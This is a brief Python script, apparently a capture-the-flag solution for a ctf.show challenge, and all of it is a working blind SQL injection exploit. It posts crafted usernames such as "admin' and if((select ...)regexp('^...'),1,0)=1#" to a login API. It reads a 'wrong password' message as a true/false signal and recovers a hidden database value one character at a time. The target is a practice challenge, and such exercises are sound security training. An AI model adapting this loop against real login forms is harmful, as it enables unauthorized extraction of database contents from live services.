#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/6/2 17:03
# blog: www.wlhhlc.top
import requests
url = "http://ee318eb9-a6c7-4394-b8ce-3f51aba8ee69.challenge.ctf.show/api/"
flag = ""
all_str = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

for i in range(1,99):
    for j in all_str:
        payload = "select group_concat(f1ag) from ctfshow_flxg"
        username_data = "admin' and if(({0})regexp('^{1}'), 1, 0)=1#".format(payload, flag + j)
        data = {'username': username_data,
                'password': 1}
        res = requests.post(url=url, data=data)
        if "密码错误" in res.json()['msg']:
            flag += j
            print(flag)
            break
        if j == "}":
            exit()
